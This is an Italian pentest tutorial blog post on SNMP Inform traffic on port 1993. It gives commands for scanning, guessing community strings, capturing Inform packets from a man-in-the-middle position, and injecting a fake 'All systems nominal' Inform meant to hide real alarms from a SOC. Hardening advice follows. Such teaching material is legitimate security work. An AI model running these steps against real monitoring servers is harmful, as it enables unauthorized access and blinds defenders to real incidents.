---
title: 'Porta 1993 SNMP: Inform, Trap e Monitoring'
slug: porta-1993-snmp-inform
description: >-
  Porta 1993 SNMP nel pentest: SNMP Inform, trap correlation, community string,
  collector alternativi e information disclosure su server di monitoring.
image: /porta-1993-snmp-inform.webp
draft: false
date: 2026-04-12T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - SNMP Inform
  - SNMP Trap
  - Network Monitoring
---

> **Executive Summary** — La porta 1993/UDP è registrata IANA per il servizio `snmp-tcp-port` ed è talvolta associata a SNMP Inform, la variante "affidabile" delle SNMP Trap. Mentre le Trap (porta 162) sono fire-and-forget (il dispositivo invia senza conferma), gli Inform richiedono un ACK dal ricevente — garantendo la consegna. In pratica, la maggior parte delle implementazioni usa la porta 162 anche per gli Inform. Se trovi la 1993 aperta, stai guardando un SNMP manager o collector alternativo. Per la guida completa su SNMP Trap e le tecniche di attacco, consulta la [guida alla porta 162 SNMP Trap](https://hackita.it/articoli/porta-162-snmptrap).

**Cos’è la porta 1993 (SNMP Inform)**

* La porta 1993 è una porta alternativa per la ricezione di SNMP Inform — trap con conferma di ricezione
* Gli Inform contengono le stesse informazioni delle Trap: stato dispositivi, allarmi, cambiamenti di configurazione
* La community string è identica a quella delle Trap/SNMP standard — comprometterne una compromette tutto

## 1. SNMP Inform vs SNMP Trap

| Aspetto      | Trap (162)                | Inform (162/1993)            |
| ------------ | ------------------------- | ---------------------------- |
| Conferma     | Nessuna (fire-and-forget) | ACK richiesto (affidabile)   |
| Retry        | No — se persa, persa      | Sì — ritrasmette fino ad ACK |
| Overhead     | Basso                     | Più alto (handshake)         |
| Porta tipica | 162/UDP                   | 162/UDP (o 1993 alternativa) |
| Contenuto    | Identico                  | Identico                     |

Il contenuto di un Inform è identico a una Trap: OID, varbind con valori di stato, timestamp. La differenza è solo nel meccanismo di trasporto (affidabilità).

```
Misconfig: Porta 1993 aperta con community string debole
Impatto: intercettazione di tutti gli Inform — stato dispositivi, allarmi, configurazioni
Come si verifica: snmpwalk -v2c -c public [target]:1993 — se risponde, community valida
```

## 2. Enumerazione

### Scan

```bash
nmap -sU -sV -p 1993 10.10.10.5
```

**Output atteso:**

```
PORT     STATE         SERVICE
1993/udp open|filtered snmp-tcp-port
```

### Test community string

```bash
# Testa community comuni
for comm in public private monitor community; do
  snmpwalk -v2c -c "$comm" 10.10.10.5:1993 system 2>/dev/null && echo "FOUND: $comm"
done
```

**Output (se risponde come SNMP manager):**

```
SNMPv2-MIB::sysDescr.0 = STRING: Linux monitor01 5.15.0-91-generic
SNMPv2-MIB::sysName.0 = STRING: monitor01.corp.local
FOUND: public
```

**Lettura dell'output:** la porta 1993 risponde a query SNMP con community `public`. Il sistema è un server di monitoring Linux. Da qui puoi enumerare l'intera configurazione come su qualsiasi porta SNMP. Per l'[enumerazione SNMP completa](https://hackita.it/articoli/porta-162-snmptrap), usa le stesse tecniche della porta 161/162.

## 3. Tecniche Offensive

**Cattura Inform in transito**

```bash
# Se sei in posizione MitM: cattura pacchetti Inform
tcpdump -i eth0 udp port 1993 -w snmp_inform.pcap
tshark -r snmp_inform.pcap -T fields -e snmp.community -e snmp.value.octets
```

**Cosa rivela:** community string in chiaro (se SNMPv1/v2c), OID e valori di stato dei dispositivi.

**SNMP walk completo sulla 1993**

Se la porta risponde come un agent SNMP completo (non solo receiver):

```bash
# Enumerazione completa
snmpwalk -v2c -c public 10.10.10.5:1993

# Target specifici di alto valore
snmpwalk -v2c -c public 10.10.10.5:1993 1.3.6.1.2.1.25.4.2  # Processi
snmpwalk -v2c -c public 10.10.10.5:1993 1.3.6.1.2.1.4.20     # Interfacce IP
```

**Injection di falso Inform**

```bash
# Invia un Inform fasullo al manager
snmptrap -v 2c -c public 10.10.10.5:1993 '' 1.3.6.1.4.1.99999 \
  1.3.6.1.4.1.99999.1 s "All systems nominal"
```

**Cosa fai dopo:** l'Inform fasullo può mascherare problemi reali o creare falsi allarmi. Se il monitoring non valida la sorgente, il team SOC potrebbe ignorare allarmi reali o reagire a falsi positivi.

## 4. Scenario Pratico

### Scenario: Porta 1993 trovata su server di monitoring

**Step 1:**

```bash
nmap -sU -p 161,162,1993 10.10.10.5
```

**Step 2:**

```bash
snmpwalk -v2c -c public 10.10.10.5:1993 system
```

**Step 3:** se risponde, applica tutte le tecniche SNMP standard (user enum, interface enum, process list)

**Step 4:** cerca la web interface del monitoring (Nagios, Zabbix, Xymon) — spesso sullo stesso host

**Se fallisce:**

* Causa: la porta 1993 è solo un receiver di Inform, non un agent SNMP
* Fix: cattura Inform in transito per intelligence passiva

**Tempo stimato:** 5-15 minuti

## 5. Cheat Sheet Finale

| Azione          | Comando                                                                    |
| --------------- | -------------------------------------------------------------------------- |
| Scan            | `nmap -sU -p 1993 [target]`                                                |
| SNMP walk       | `snmpwalk -v2c -c public [target]:1993`                                    |
| Community brute | `onesixtyone -c community.txt [target]:1993`                               |
| Capture traffic | `tcpdump -i eth0 udp port 1993 -w inform.pcap`                             |
| Inject Inform   | `snmptrap -v 2c -c public [target]:1993 '' [OID]`                          |
| Correlate       | Vedi [porta 162 SNMP Trap](https://hackita.it/articoli/porta-162-snmptrap) |

### Perché Porta 1993 è rilevante

La porta 1993 indica infrastruttura di monitoring SNMP — spesso su server che hanno visibilità su tutta la rete. La community string è la stessa del sistema SNMP principale. Il server di monitoring è un target ad alto valore: compromettere il monitoring significa cecità dell'infrastruttura.

### Hardening

* Stesse best practice di SNMP: SNMPv3 con autenticazione e cifratura
* Community string forti e uniche
* Firewall: 1993/UDP solo da dispositivi autorizzati
* Valida la sorgente degli Inform

***

Riferimento: RFC 3416 (SNMPv2 Protocol Operations), RFC 3414 (SNMPv3 USM). Uso esclusivo in ambienti autorizzati.

> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
